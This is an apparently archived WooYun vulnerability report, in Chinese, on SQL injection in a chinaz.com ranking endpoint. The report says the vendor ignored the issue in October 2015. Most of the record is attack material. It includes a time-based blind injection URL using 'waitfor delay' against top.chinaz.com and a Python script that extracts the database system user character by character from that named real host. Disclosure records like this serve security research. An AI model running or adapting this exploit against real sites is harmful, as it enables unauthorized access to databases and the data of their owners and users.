wybug_title: 站长之家某站存在SQL注入（附脚本）
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-10-10：	细节已通知厂商并且等待厂商处理中									2015-10-15：	厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  http://top.chinaz.com/Action/listAjax.aspx?at=changeNextList&p=2&sj=0.3962032066192478&t=XsHOEFlA0h')); if LeN(SYstem_User)=9 waitfor delay '0:0:3' -- &_=1444449646120

user长度为9


#encoding=gbkimport httplibimport timeimport stringimport sysimport randomimport urllibheaders = {    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',}payloads = list(string.ascii_lowercase)for i in range(0,10):    payloads.append(str(i))payloads += ['@','_', '.', '-', '\\', ' ']print 'Try to retrive user:'user = ''for i in range(1,10):    for payload in payloads:                time.sleep(1)  #间隔一秒        try:                       conn = httplib.HTTPConnection('top.chinaz.com', timeout=5)            s = "if (ascii(substring(system_user,%s,1))=%s) waitfor delay '0:0:5' --" % (i, ord(payload))            params = "at=changeNextList&p=2&sj=0.3962032066192478&t=XsHOEFlA0h'));" + urllib.quote(s)            conn.request(method='GET', url= '/Action/listAjax.aspx?' + params,                         headers = headers)            html_doc = conn.getresponse().read()            conn.close()            print '.',        except Exception, e:            user += payload            print '\nIn progress]', user            break        print '\n[Done] User is:', user
   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-10-15 16:20 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无
